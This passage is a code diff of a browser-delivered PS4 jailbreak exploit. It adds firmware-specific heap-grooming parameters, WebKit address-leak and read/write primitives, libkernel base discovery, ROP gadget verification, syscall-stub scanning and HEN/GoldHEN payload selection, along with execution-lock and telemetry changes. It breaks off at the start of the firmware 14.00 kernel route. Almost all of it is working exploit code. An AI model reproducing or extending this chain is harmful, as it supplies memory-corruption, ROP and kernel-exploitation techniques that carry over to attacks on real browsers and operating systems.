@@ -4,10 +4,12 @@ try {
   }
 } catch (e) {}
 
-import { establishPrimitive } from "./core.js?v=10";
+import { establishPrimitive } from "./core.js?v=16";
+import { inspectExecutionLock } from "./execution-lock-policy.js?v=lock-policy-1";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor, validateOffsets } from "./ps4_offsets.js";
+import { resolvePayload } from "./HENs.js?v=hen14-only-1";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
@@ -19,6 +21,10 @@ const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 const EXECUTION_LOCK_KEY = "raw13g:jb:execution-lock:v2";
 const EXECUTION_OWNER_KEY = "__RAW13G_JB_EXECUTION_OWNER__";
 const EXECUTION_HEARTBEAT_MS = 15000;
+let executionRunId = "";
+let executionStartedAt = 0;
+let executionFirmware = "";
+let kernelStageEntered = false;
 
 function createExecutionOwner() {
   return String(Date.now()) + "-" + String(Math.floor(Math.random() * 1000000));
@@ -51,25 +57,29 @@ function acquireExecutionLock() {
     }
   }
 
-  if (existing && existing.owner) {
-    const isStale =
-      typeof existing.startedAt === "number" &&
-      Date.now() - existing.startedAt > 45000;
-    if (!isStale) {
-      return {
-        ok: false,
-        reason: existing.state || "already-running",
-        owner: existing.owner,
-        startedAt: existing.startedAt,
-      };
-    }
+  const inspection = inspectExecutionLock(existing, Date.now());
+  if (inspection.blocked) {
+    return {
+      ok: false,
+      reason: inspection.reason || "already-running",
+      owner: existing && existing.owner,
+      startedAt: inspection.startedAt,
+      updatedAt: inspection.updatedAt,
+      lockState: inspection.state,
+      lockStage: inspection.stage,
+      lockAgeMs: inspection.ageMs,
+      lockProtected: inspection.protected,
+    };
   }
 
   const owner = createExecutionOwner();
+  const startedAt = Date.now();
   const record = {
     owner,
     state: "running",
-    startedAt: Date.now(),
+    startedAt,
+    updatedAt: startedAt,
+    stage: 1,
     firmware: navigator.userAgent,
   };
   try {
@@ -79,7 +89,13 @@ function acquireExecutionLock() {
       return { ok: false, reason: "ownership-lost" };
     }
     globalThis[EXECUTION_OWNER_KEY] = owner;
-    return { ok: true, owner };
+    return {
+      ok: true,
+      owner,
+      recoveredStaleLock: inspection.stale,
+      previousLockState: inspection.state,
+      previousLockAgeMs: inspection.ageMs,
+    };
   } catch (e) {
     return { ok: false, reason: "storage-write-failed" };
   }
@@ -93,8 +109,17 @@ function updateExecutionLock(state) {
     if (!current || current.owner !== owner) return;
     current.state = state;
     current.updatedAt = Date.now();
+    current.stage = typeof currentStage === "number" ? currentStage : current.stage;
     localStorage.setItem(EXECUTION_LOCK_KEY, JSON.stringify(current));
   } catch (e) {}
+}
+
+function executionLockHeartbeatState() {
+  if (kernelDataDirty || jailbroken || kpatched || payloadRunning) {
+    return "kernel-dirty";
+  }
+  if (kernelStageEntered || currentStage >= 2) return "reboot_required";
+  return "running";
 }
 
 function releaseExecutionLockIfSafe(kernelTouched) {
@@ -118,11 +143,138 @@ function post(tag, detail) {
       "PS4-JB&tag=" +
         encodeURIComponent(tag) +
         "&detail=" +
-        encodeURIComponent(String(detail == null ? "" : detail)),
+        encodeURIComponent(String(detail == null ? "" : detail)) +
+        "&runId=" +
+        encodeURIComponent(executionRunId) +
+        "&stage=" +
+        encodeURIComponent(String(typeof currentStage === "number" ? currentStage : 0)) +
+        "&elapsedMs=" +
+        encodeURIComponent(String(executionStartedAt ? Date.now() - executionStartedAt : 0)) +
+        "&firmware=" +
+        encodeURIComponent(executionFirmware),
     );
   } catch (error_) {
     /* telemetry is best-effort */
   }
+}
+
+// A browser reload can interrupt the async execution before the outer
+// try/finally gets a chance to release the lock.  It is safe to release only
+// while still in stage 1; once workers/sockets are active, keep the lock so a
+// second page cannot race a potentially dirty kernel state.
+let pageExitLockReleased = false;
+function releaseExecutionLockOnSafePageExit() {
+  if (pageExitLockReleased) return;
+  if (
+    typeof currentStage === "number" &&
+    currentStage >= 2
+  )
+    return;
+  if (
+    kernelStageEntered ||
+    kernelDataDirty ||
+    jailbroken ||
+    kpatched ||
+    payloadRunning ||
+    allDone
+  )
+    return;
+  pageExitLockReleased = true;
+  releaseExecutionLockIfSafe(false);
+}
+
+if (typeof window !== "undefined" && window.addEventListener) {
+  window.addEventListener("pagehide", releaseExecutionLockOnSafePageExit);
+  window.addEventListener("beforeunload", releaseExecutionLockOnSafePageExit);
+}
+
+function reportExecutionTelemetry(event, details) {
+  try {
+    if (typeof window !== "undefined" && window.reportExecutionTelemetry) {
+      window.reportExecutionTelemetry(event, details || {});
+    }
+  } catch (error_) {
+    // Diagnostics must never change execution behavior.
+  }
+}
+
+function reportExecutionDiagnostics(kind, details) {
+  try {
+    if (typeof window !== "undefined" && window.reportExecutionDiagnostics) {
+      window.reportExecutionDiagnostics(kind, details || {});
+    }
+  } catch (error_) {
+    // Diagnostics must never change execution behavior.
+  }
+}
+
+function boundedTuningValue(name, fallback, minimum, maximum) {
+  let value = fallback;
+  try {
+    for (const item of params.getAll("g")) {
+      const parts = String(item).split(":");
+      if (parts[0] !== name) continue;
+      const parsed = parts[1] && parts[1].startsWith("0x")
+        ? Number.parseInt(parts[1], 16)
+        : Number.parseInt(parts[1], 10);
+      if (Number.isFinite(parsed) && parsed >= minimum && parsed <= maximum) {
+        value = Math.trunc(parsed);
+      }
+    }
+  } catch (error_) {}
+  return value;
+}
+
+function offsetSummary(off, validation) {
+  let hash = 2166136261;
+  let offsetCount = 0;
+  let offsetAligned = 0;
+  const seen = [];
+  function mix(text) {
+    const value = String(text);
+    for (let i = 0; i < value.length; i++) {
+      hash ^= value.charCodeAt(i);
+      hash = Math.imul(hash, 16777619);
+    }
+  }
+  function visit(value, path) {
+    if (typeof value === "number" && Number.isFinite(value)) {
+      offsetCount++;
+      if (Number.isInteger(value) && value >= 0 && value % 8 === 0) offsetAligned++;
+      // The numeric value contributes only to the local digest, never to the record.
+      mix(path + "=n:" + String(value));
+      return;
+    }
+    if (typeof value === "string") {
+      mix(path + "=s:" + value);
+      return;
+    }
+    if (!value || typeof value !== "object" || seen.indexOf(value) !== -1) return;
+    seen.push(value);
+    Object.keys(value).sort().forEach((key) => visit(value[key], path + "." + key));
+  }
+  if (off) visit(off, "offsets");
+  const summary = {
+    offsetCount,
+    offsetAligned,
+    offsetMissing: validation && Array.isArray(validation.errors) ? validation.errors.length : 0,
+  };
+  if (off) summary.offsetHash = ("00000000" + (hash >>> 0).toString(16)).slice(-8);
+  return summary;
+}
+
+function reportApplicationTelemetry(event, details) {
+  try {
+    if (typeof window !== "undefined" && window.reportApplicationTelemetry) {
+      window.reportApplicationTelemetry(event, details || {});
+    }
+  } catch (error_) {
+    // Application diagnostics are best-effort and must not affect execution.
+  }
+}
+
+function payloadAssetName(filePath) {
+  return String(filePath || "").split(/[?#]/, 1)[0].split(/[\\/]/).pop().slice(0, 128);
 }
 
 const VERBOSE = params.get("verbose") === "1";
@@ -147,11 +299,11 @@ function terse(s) {
   return s;
 }
 
-const SHOW_LOG = params.get("log") === "1";
+const SHOW_LOG = params.get("log") !== "0";
 if (SHOW_LOG && document.body) document.body.className = "log";
-function finishUI(ok) {
+function finishUI(ok, partial = false) {
   if (SHOW_LOG || !document.body) return;
-  document.body.className = ok ? "done" : "fail";
+  document.body.className = ok ? "done" : partial ? "partial" : "fail";
 }
 function mark(tag, detail) {
   const raw = detail;
@@ -180,6 +332,10 @@ function mark(tag, detail) {
   post(tag, raw);
 }
 
+function markSync(tag, detail) {
+  mark(tag, detail);
+}
+
 function trace(tag, detail) {
   if (VERBOSE) mark(tag, detail);
   else post(tag, detail);
@@ -187,6 +343,8 @@ function trace(tag, detail) {
 let currentStage = 1;
 function setStageUI(step, title, sub, c) {
   currentStage = step;
+  if (step >= 2) updateExecutionLock(executionLockHeartbeatState());
+  reportExecutionTelemetry("stage", { stage: step });
   if (typeof window !== "undefined" && window.setStage) {
     window.setStage(step, title, sub, c);
   } else {
@@ -217,6 +375,7 @@ function check(name, ok, detail) {
 const SYS = {
   getpid: 20,
   getuid: 0x18,
+  setuid: 23,
   close: 6,
   socket: 97,
   socketpair: 0x87,
@@ -297,7 +456,8 @@ let allDone = false,
   kpatched = false,
   payloadRunning = false,
   alreadyRoot = false,
-  kernelDataDirty = false;
+  kernelDataDirty = false,
+  stage1Only = false;
 
 const WORKER_STATE = {
   CREATED: "created",
@@ -310,10 +470,23 @@ const WORKER_STATE = {
 (async function () {
   const executionLock = acquireExecutionLock();
   if (!executionLock.ok) {
+    reportExecutionTelemetry("blocked", {
+      status: executionLock.reason,
+      lockOwner: executionLock.owner,
+      lockState: executionLock.lockState,
+      lockStage: executionLock.lockStage,
+      lockAgeMs: executionLock.lockAgeMs,
+      lockStartedAt: executionLock.startedAt,
+      lockUpdatedAt: executionLock.updatedAt,
+      lockProtected: executionLock.lockProtected,
+    });
     mark(
       "EXECUTION-BLOCKED",
       "reason=" + executionLock.reason +
-        (executionLock.startedAt ? " started=" + executionLock.startedAt : ""),
+        " owner=" + (executionLock.owner || "unknown") +
+        " state=" + (executionLock.lockState || "unknown") +
+        " age-ms=" + (executionLock.lockAgeMs == null ? "unknown" : executionLock.lockAgeMs) +
+        " protected=" + !!executionLock.lockProtected,
     );
     if (window.showExecutionReset && executionLock.reason !== "same-document") {
       window.showExecutionReset(executionLock.reason);
@@ -321,8 +494,8 @@ const WORKER_STATE = {
     const blockedDetail =
       executionLock.reason === "completed"
         ? "Jailbreak concluído na sessão anterior. Se reiniciou o console, use o botão abaixo para liberar."
-        : executionLock.reason === "kernel-dirty"
-        ? "Kernel alterado anteriormente. Reinicie o console e use o botão abaixo para liberar."
+        : ["kernel-dirty", "reboot_required", "reboot-required"].includes(executionLock.reason)
+        ? "A execução alcançou uma etapa protegida. Reinicie o console antes de liberar o bloqueio."
         : executionLock.reason === "running"
         ? "Uma execução anterior consta como em andamento. Se travou ou reiniciou, use o botão abaixo para liberar."
         : "Execução já iniciada ou bloqueada (" + executionLock.reason + ").";
@@ -331,7 +504,33 @@ const WORKER_STATE = {
     finishUI(false);
     return;
   }
-  let executionHeartbeat = null;
+  executionRunId = executionLock.owner;
+  executionStartedAt = Date.now();
+  if (executionLock.recoveredStaleLock) {
+    mark(
+      "EXECUTION-LOCK-STALE-RECLAIMED",
+      "previous-state=" + (executionLock.previousLockState || "unknown") +
+        " age-ms=" + executionLock.previousLockAgeMs,
+    );
+  }
+  let completionStatus = "running";
+  const payloadEnabledForRun = params.get("payload") !== "0";
+  let selectedApplicationForTelemetry = "";
+  let selectedAssetForTelemetry = "";
+  let payloadAssetStatusReported = false;
+  reportExecutionTelemetry("start", {
+    runId: executionRunId,
+    options: {
+      jb: params.get("jb") !== "0",
+      patch: params.get("patch") !== "0",
+      payload: params.get("payload") !== "0",
+      keepJb: params.get("keepjb") === "1"
+    }
+  });
+  let executionHeartbeat = setInterval(
+    () => updateExecutionLock(executionLockHeartbeatState()),
+    EXECUTION_HEARTBEAT_MS,
+  );
   try {
     sessionStorage.setItem("jb_session_state", "in_progress");
   } catch (e) {}
@@ -343,15 +542,23 @@ const WORKER_STATE = {
   let resourceLedger = null;
   try {
     const { key, off } = offsetsFor(navigator.userAgent);
+    executionFirmware = key || "";
+    reportExecutionTelemetry("firmware", {
+      runId: executionLock.owner,
+      firmware: key || "unknown",
+      status: off ? "recognized" : "unsupported"
+    });
     mark("FW", key || "(not a PS4 UA)");
+    const fwKey = key || "unknown";
+    const offValidation = validateOffsets(off, fwKey);
+    reportExecutionDiagnostics("offsets", offsetSummary(off, offValidation));
     if (!off) {
+      completionStatus = "unsupported-firmware";
       state("no offsets for this firmware", "bad");
       return;
     }
-    const fwKey = key || "unknown";
-
-    const offValidation = validateOffsets(off, fwKey);
     if (!offValidation.ok) {
+      completionStatus = "invalid-offsets";
       mark("OFFSETS-INVALID", offValidation.errors.join("; "));
       state("invalid offsets detected", "bad");
       setStageUI(1, "OFFSETS INVÁLIDOS", offValidation.errors.slice(0, 2).join("<br>"), "bad");
@@ -364,6 +571,15 @@ const WORKER_STATE = {
     const DO_PAYLOAD = params.get("payload") !== "0";
 
     const KEEP_JB = params.get("keepjb") === "1";
+    const HX1400_REQUESTED = params.get("hx1400") === "1";
+    const HX1400_MODE = HX1400_REQUESTED && fwKey === "14.00";
+    if (HX1400_REQUESTED && !HX1400_MODE) {
+      completionStatus = "unsupported-hx1400-firmware";
+      mark("HX1400-UNSUPPORTED", "the HX1400 route is restricted to firmware 14.00");
+      state("HX1400 disponível somente no firmware 14.00", "bad");
+      setStageUI(1, "FIRMWARE INCOMPATÍVEL", "A implementação HX1400 integrada é específica para 14.00.", "bad");
+      return;
+    }
 
     const NEED_K = [
       "k_idt_rsvd",
@@ -377,8 +593,39 @@ const WORKER_STATE = {
       "k_prison0",
       "k_rootvnode",
     ];
-    const missing = NEED_K.filter((k) => off[k] === undefined);
-    if (
+    const kernelSupported = off.kernel_supported !== false;
+    const HX1400_ROUTE_ELIGIBLE =
+      HX1400_MODE && off.stage1_only === true && !kernelSupported;
+    const requestedMemProfile = params.get("mem");
+    const selectedGroomProfile =
+      HX1400_MODE && requestedMemProfile === "1" && off.groomProfiles?.mem1
+        ? off.groomProfiles.mem1
+        : off.groom;
+    const selectedGroomProfileName =
+      selectedGroomProfile?.profile || "firmware-default";
+    mark(
+      "HX1400-ROUTE-ELIGIBILITY",
+      "requested=" + HX1400_REQUESTED +
+        " firmware=" + fwKey +
+        " stage1Only=" + (off.stage1_only === true) +
+        " kernelSupported=" + kernelSupported +
+        " eligible=" + HX1400_ROUTE_ELIGIBLE,
+    );
+    if (HX1400_MODE && requestedMemProfile && requestedMemProfile !== "1") {
+      mark(
+        "GROOM-PROFILE-UNSUPPORTED",
+        "mem=" + requestedMemProfile + " supported=1; using firmware default",
+      );
+    }
+    const missing = kernelSupported
+      ? NEED_K.filter((k) => off[k] === undefined)
+      : [];
+    if (!kernelSupported) {
+      mark(
+        "LEGACY-KERNEL-TABLE-SKIPPED",
+        "FW " + fwKey + " has no verified RAW13G kernel table; HX1400 uses hx_tables.js",
+      );
+    } else if (
       !check(
         "kernel-table-present",
         missing.length === 0,
@@ -390,66 +637,92 @@ const WORKER_STATE = {
           " -- dump this firmware with kdump5.html and derive its table" +
           " with tools/kderive.py; stage=pre_primitive",
       )
-    )
+    ) {
       return;
+    }
 
     const KPATCH_FILE =
       "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
-    
-    // Dynamic payload selection based on user preference (GoldHEN vs HEN)
-    const explicitPayload = params.get("payload_path") || sessionStorage.getItem("payload_path");
-    const userFlavor = params.get("flavor") || localStorage.getItem("jailbreakFlavor") || "GoldHEN";
-    let chosenPayload = "includes/payloads/HEN/payload2.bin";
-    if (explicitPayload) {
-      chosenPayload = explicitPayload;
-    } else if (userFlavor === "GoldHEN" && off.payload_goldhen) {
-      chosenPayload = off.payload_goldhen;
-    } else {
-      chosenPayload = off.payload_hen || off.payload || "includes/payloads/HEN/payload2.bin";
-    }
-    const PAYLOAD_FILE = chosenPayload;
-    const effectiveFlavor = chosenPayload.toLowerCase().includes("goldhen") ? "GoldHEN" : "PS4HEN";
+
+    // Resolve only bundled payloads and enforce the firmware compatibility
+    // policy again at runtime. URL/session storage paths are not trusted.
+    const payloadSelection = resolvePayload(fwKey, params.get("flavor"));
+    const PAYLOAD_FILE = payloadSelection.path;
+    const effectiveFlavor = payloadSelection.flavor;
+    const PAYLOAD_ASSET = payloadAssetName(PAYLOAD_FILE);
+    selectedApplicationForTelemetry = effectiveFlavor;
+    selectedAssetForTelemetry = PAYLOAD_ASSET;
+    reportApplicationTelemetry("selected", {
+      application: effectiveFlavor,
+      asset: PAYLOAD_ASSET,
+      status: DO_PAYLOAD ? "selected" : "disabled"
+    });
+    mark("PAYLOAD-SELECTED", "flavor=" + effectiveFlavor + " file=" + PAYLOAD_FILE + " asset=" + PAYLOAD_ASSET);
     const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
       (k) => off[k] === undefined,
     );
-    if (
+    if (!kernelSupported) {
+      mark(
+        "LEGACY-KPATCH-TABLE-SKIPPED",
+        "FW " + fwKey + " does not use the legacy RAW13G sysent patch table; HX1400 kernel data is separate",
+      );
+    } else if (!DO_PATCH) {
+      mark("KPATCH-TABLE-CHECK-SKIPPED", "kernel patching disabled by request");
+    } else if (
       !check(
         "kpatch-table-present",
-        !DO_PATCH || needPatch.length === 0,
+        needPatch.length === 0,
         "missing=[" +
           needPatch.join(",") +
           "] blob=" +
           KPATCH_FILE +
           " -- build it from patches/<fw>.c, see patches/1300.c",
       )
-    )
+    ) {
       return;
+    }
     const needPl = ["wk___imp_pthread_create", "k_pthread_create"].filter(
       (k) => off[k] === undefined,
     );
-    if (
+    if (!kernelSupported) {
+      mark(
+        "LEGACY-PAYLOAD-TABLE-SKIPPED",
+        "FW " + fwKey + " leaves legacy pthread offsets undefined; HX1400 launch path is separate",
+      );
+    } else if (!DO_PAYLOAD) {
+      mark("PAYLOAD-TABLE-CHECK-SKIPPED", "payload launch disabled by request");
+    } else if (
       !check(
         "payload-table-present",
-        !DO_PAYLOAD || needPl.length === 0,
+        needPl.length === 0,
         "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
       )
-    )
+    ) {
       return;
+    }
     mark("FW-STATUS", off.fw_status || "none");
-    mark(
-      "FW-KTABLE",
-      "idt_rsvd=0x" +
-        off.k_idt_rsvd.toString(16) +
-        " prison0=0x" +
-        off.k_prison0.toString(16) +
-        " rootvnode=0x" +
-        off.k_rootvnode.toString(16) +
-        " kpatch=" +
-        KPATCH_FILE +
-        " payload=" +
-        PAYLOAD_FILE +
-        " src=ps4_offsets.js",
-    );
+    if (!kernelSupported) {
+      mark(
+        "FW-KTABLE",
+        "kernel offsets intentionally unavailable; HX1400 tables are separate; " +
+          "legacy RAW13G kernel path disabled; blob=" + KPATCH_FILE,
+      );
+    } else {
+      mark(
+        "FW-KTABLE",
+        "idt_rsvd=0x" +
+          off.k_idt_rsvd.toString(16) +
+          " prison0=0x" +
+          off.k_prison0.toString(16) +
+          " rootvnode=0x" +
+          off.k_rootvnode.toString(16) +
+          " kpatch=" +
+          KPATCH_FILE +
+          " payload=" +
+          PAYLOAD_FILE +
+          " src=ps4_offsets.js",
+      );
+    }
 
     // ---- benign-miss auto-retry (reads only, before any kernel write) ----
     // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
@@ -484,6 +757,24 @@ const WORKER_STATE = {
         mark("AUTO-RETRY-DISABLED", "why=" + why + " (diagnostic mode via ?autoretry=0)");
         return false;
       }
+      // Research notes warn that reloading after workers/sockets are active
+      // can leave dangling kernel state. Keep automatic reloads stage-1 only;
+      // later misses must use the visible reboot/reset path.
+      if (
+        currentStage >= 2 ||
+        kernelStageEntered ||
+        kernelDataDirty ||
+        kpatched ||
+        jailbroken ||
+        payloadRunning ||
+        allDone
+      ) {
+        mark(
+          "AUTO-RETRY-BLOCKED",
+          "why=" + why + " stage=" + currentStage + " (reboot required)",
+        );
+        return false;
+      }
       const n = retryCount();
       if (n >= RETRY_MAX) {
         mark(
@@ -507,6 +798,7 @@ const WORKER_STATE = {
       );
       setTimeout(() => {
         try {
+          releaseExecutionLockOnSafePageExit();
           location.reload();
         } catch (e) {}
       }, 400);
@@ -527,16 +819,86 @@ const WORKER_STATE = {
         const n = q ? parseInt(q, 10) : 0;
         if (n >= 1 && n <= 4) return n;
       } catch (e) {}
-      return 1;
+      // Firmware profiles may allow bounded retries after the core confirms
+      // that the failed attempt did not mutate the candidate/kernel state.
+      const profiled = Number(selectedGroomProfile && selectedGroomProfile.attempts);
+      return Number.isInteger(profiled) && profiled >= 1 && profiled <= 4 ? profiled : 1;
     })();
+    const carrierSlotsParam = (function () {
+      try {
+        const n = Number.parseInt(params.get("slots"), 10);
+        if (Number.isFinite(n) && n >= 100000 && n <= 40000000) return n;
+      } catch (e) {}
+      const profiled = Number(selectedGroomProfile && selectedGroomProfile.slots);
+      return Number.isInteger(profiled) && profiled >= 100000 && profiled <= 40000000 ? profiled : 2800000;
+    })();
+    const drainCountParam = boundedTuningValue("drain", Number(selectedGroomProfile?.drain ?? 256), 1, 100000);
+    const drainSizeParam = boundedTuningValue("drainsz", Number(selectedGroomProfile?.drainsz ?? 0x10000), 0x1000, 0x400000);
+    const slabSizeParam = boundedTuningValue("slab", Number(selectedGroomProfile?.slab ?? 0x400000), 0x10000, 0x1000000);
+    const groomSettings = {
+      ...selectedGroomProfile,
+      profile: selectedGroomProfileName,
+      slots: carrierSlotsParam,
+      attempts: maxAttemptsParam,
+      drain: drainCountParam,
+      drainsz: drainSizeParam,
+      slab: slabSizeParam,
+      histdelay: boundedTuningValue("histdelay", Number(selectedGroomProfile?.histdelay ?? 0), 0, 100000),
+      bfly: boundedTuningValue("bfly", Number(selectedGroomProfile?.bfly ?? 0x81000), 0x1000, 0x1000000),
+      sep: boundedTuningValue("sep", Number(selectedGroomProfile?.sep ?? 0x10000), 0x1000, 0x1000000),
+      early: boundedTuningValue("early", Number(selectedGroomProfile?.early ?? 0x70000), 0x1000, 0x1000000),
+      guard: boundedTuningValue("guard", Number(selectedGroomProfile?.guard ?? 0x90000), 0x1000, 0x1000000),
+      pred: boundedTuningValue("pred", Number(selectedGroomProfile?.pred ?? 0x80000), 0x1000, 0x1000000),
+      final: boundedTuningValue("final", Number(selectedGroomProfile?.final ?? 0x80000), 0x1000, 0x1000000),
+    };
+    mark(
+      "GROOM-PROFILE",
+      "name=" + selectedGroomProfileName +
+        " slots=" + groomSettings.slots +
+        " attempts=" + groomSettings.attempts +
+        " drain=" + groomSettings.drain +
+        " drainsz=" + groomSettings.drainsz +
+        " slab=" + groomSettings.slab +
+        " bfly=" + groomSettings.bfly +
+        " sep=" + groomSettings.sep +
+        " early=" + groomSettings.early +
+        " guard=" + groomSettings.guard +
+        " pred=" + groomSettings.pred +
+        " final=" + groomSettings.final,
+    );
+    reportExecutionDiagnostics("profile", {
+      carrierSlots: carrierSlotsParam,
+      maxAttempts: maxAttemptsParam,
+      drainCount: drainCountParam,
+      drainBytes: drainCountParam * drainSizeParam,
+      slabBytes: slabSizeParam,
+    });
 
     const PRIMITIVE_LOUD =
-      /FAIL|ERROR|THREW|RETRY|ABORT|PASS|ADDROF|CARRIER|SSV|GROOM|PREDECESSOR|DELAY|HIST|MISS|MISMATCH/i;
+      /FAIL|ERROR|THREW|RETRY|ABORT|PASS|ADDROF|CARRIER|CANDIDATE|COPY|MEMORY|SSV|GROOM|PREDECESSOR|DELAY|HIST|MISS|MISMATCH/i;
     const carrier = await establishPrimitive({
       maxAttempts: maxAttemptsParam,
+      groomOverrides: groomSettings,
       onEvent: (t, d, a) => {
         if (a != null) {
           updateSub("Tentativa " + a + "/" + maxAttemptsParam + ": Ajustando memória e ArrayBuffers (" + t + ")...");
+        }
+        const eventText = String(t || "");
+        const detailText = String(d || "");
+        if (eventText === "ADDROF-COPY") {
+          const copied = detailText.match(/chars=(\d+)-source-covered=(true|false)/i);
+          if (copied) {
+            reportExecutionDiagnostics("profile", {
+              copiedChars: Number.parseInt(copied[1], 10),
+              sourceCovered: copied[2].toLowerCase() === "true",
+              attemptNumber: Number.isFinite(Number(a)) ? Number(a) : 0,
+            });
+          }
+        } else if (eventText === "SSV-PLACEMENT-MISS") {
+          reportExecutionDiagnostics("profile", {
+            placementError: "ssv-deserialize",
+            attemptNumber: Number.isFinite(Number(a)) ? Number(a) : 0,
+          });
         }
         (PRIMITIVE_LOUD.test(t) ? mark : trace)(
           t,
@@ -556,43 +918,71 @@ const WORKER_STATE = {
         "   (promotion off: the 137 MB stays pinned)",
     );
     mark("PRIMITIVE-OK", "");
+    mark(
+      "PRIMITIVE-HANDOFF",
+      "phase=webkit-native-resolution hx1400=" + HX1400_MODE,
+    );
     clearRetry();
     setStageUI(1, "ETAPA 1/4: WebKit Primitives Prontas", "Primitivas de leitura/escrita ARW estabelecidas com sucesso.", "ok");
 
-    executionHeartbeat = setInterval(
-      () => updateExecutionLock("running"),
-      EXECUTION_HEARTBEAT_MS,
-    );
-
+    mark("NATIVE-FUNCTION-LOOKUP-START", "symbol=Math.expm1");
     const cell = p.leakval(Math.expm1);
+    mark("NATIVE-FUNCTION-LOOKUP-OK", "symbol=Math.expm1");
     const nativeFn = p.read8(
       p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function),
     );
+    mark("NATIVE-FUNCTION-POINTER-READ", "resolved=true");
     const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+    mark("WEBKIT-BASE-RESOLVED", "resolved=true");
     const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
+    mark("LIBKERNEL-ERROR-IMPORT-RESOLVED", "resolved=true");
     let libkernelBase = null;
     let measuredKError = null;
-    const libkernelSearchStart = errorFn.and32(0xffffc000);
-    for (let i = 0; i <= 0x100; ++i) {
-      const candidate = libkernelSearchStart.sub32(i * 0x4000);
+    mark("LIBKERNEL-ELF-SCAN-START", "step=0x4000 maxSteps=257");
+    if (off.k__error !== undefined) {
+      libkernelBase = errorFn.sub32(off.k__error);
+      const libkernelAdjust = libkernelBase.low & 0x3fff;
+      if (libkernelAdjust !== 0) {
+        libkernelBase = libkernelBase.sub32(libkernelAdjust);
+        mark(
+          "HX1400-LIBKERNEL-ALIGN",
+          "adjust=0x" + libkernelAdjust.toString(16) + " base=" + libkernelBase,
+        );
+      }
+      measuredKError = (errorFn.low - libkernelBase.low) >>> 0;
+      let magic = 0;
       try {
-        if ((p.read4(candidate) >>> 0) !== 0x464c457f) continue;
-        libkernelBase = candidate;
-        measuredKError = (errorFn.low - candidate.low) >>> 0;
-        break;
+        magic = p.read4(libkernelBase) >>> 0;
       } catch (e) {}
-    }
-    if (!libkernelBase) {
       mark(
-        "LIBKERNEL-ELF-NOT-FOUND",
-        "errorFn=" + errorFn + " search=0x4000/4MB",
+        "LIBKERNEL-DISCOVERED",
+        "base=" + libkernelBase + " k__error=0x" + measuredKError.toString(16) +
+          " magic=0x" + magic.toString(16) +
+          (magic === 0x464c457f ? " (ELF OK)" : " (headers not mapped)"),
       );
-      return;
+    } else {
+      const libkernelSearchStart = errorFn.and32(0xffffc000);
+      for (let i = 0; i <= 0x10; ++i) {
+        const candidate = libkernelSearchStart.sub32(i * 0x4000);
+        try {
+          if ((p.read4(candidate) >>> 0) !== 0x464c457f) continue;
+          libkernelBase = candidate;
+          measuredKError = (errorFn.low - candidate.low) >>> 0;
+          break;
+        } catch (e) {}
+      }
+      if (!libkernelBase) {
+        mark(
+          "LIBKERNEL-ELF-NOT-FOUND",
+          "errorFn=" + errorFn + " search=0x4000/64KB",
+        );
+        return;
+      }
+      mark(
+        "LIBKERNEL-DISCOVERED",
+        "base=" + libkernelBase + " k__error=0x" + measuredKError.toString(16),
+      );
     }
-    mark(
-      "LIBKERNEL-DISCOVERED",
-      "base=" + libkernelBase + " k__error=0x" + measuredKError.toString(16),
-    );
     mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
     const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
     if (
@@ -604,6 +994,7 @@ const WORKER_STATE = {
     )
       return;
 
+    mark("GADGET-VERIFY-START", "expected=15");
     const G = {};
     const GAD = [
       ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
@@ -654,6 +1045,7 @@ const WORKER_STATE = {
       )
     )
       return;
+    mark("GADGET-VERIFY-COMPLETE", "verified=" + gated + "/" + GAD.length);
     const argGadget = [
       G.POP_RDI_RET,
       G.POP_RSI_RET,
@@ -663,6 +1055,7 @@ const WORKER_STATE = {
       G.POP_R9_RET,
     ];
 
+    mark("SYSCALL-STUB-SCAN-START", "required=" + Object.keys(SYS).length);
     const stubAddr = new Map();
     let seeded = 0;
     if (off.k_stubs) {
@@ -694,6 +1087,10 @@ const WORKER_STATE = {
     }
     mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
     const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
+    mark(
+      "SYSCALL-STUBS-READY",
+      "found=" + stubAddr.size + " missing=" + miss.length,
+    );
     if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
       return;
 
@@ -800,11 +1197,18 @@ const WORKER_STATE = {
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
     }
     const pid = sc(SYS.getpid).i32;
+    const uidNow = sc(SYS.getuid).i32;
     check(
       "chain-reaches-kernel",
       pid > 0,
-      "pid=" + pid + " uid=" + sc(SYS.getuid).i32,
+      "pid=" + pid + " uid=" + uidNow,
     );
+    const identityDiagnostics = {
+      pid,
+      uidClass: uidNow === 0 ? "root" : uidNow >= 0 ? "user" : "error",
+    };
+    if (params.get("diag") === "1") identityDiagnostics.uid = uidNow >>> 0;
+    reportExecutionDiagnostics("identity", identityDiagnostics);
 
     // Prevenção de Kernel Panic: se o console já estiver desbloqueado (root ativo),
     // aborta a cadeia do kernel imediatamente para não causar concorrência destrutiva.
@@ -822,11 +1226,171 @@ const WORKER_STATE = {
           localStorage.setItem("jb_last_state", "completed");
           localStorage.setItem("jb_last_completed_at", String(Date.now()));
           localStorage.setItem("jb_last_flavor", effectiveFlavor || "HEN");
+          if (typeof window.showPostExploitTools === "function") {
+            window.showPostExploitTools();
+          }
         } catch (e) {}
         return;
       }
     } catch (error_) {
       /* pre-check is best-effort before full kernel initialization */
+    }
+
+    mark(
+      "HX1400-POST-PRIMITIVE-GATE",
+      "eligible=" + HX1400_ROUTE_ELIGIBLE +
+        " primitiveReady=" + !!p +
+        " libkernelReady=" + !!libkernelBase,
+    );
+    if (HX1400_ROUTE_ELIGIBLE) {
+      // This route uses the 14.00 HX kernel chain, not the legacy RAW13G workers.
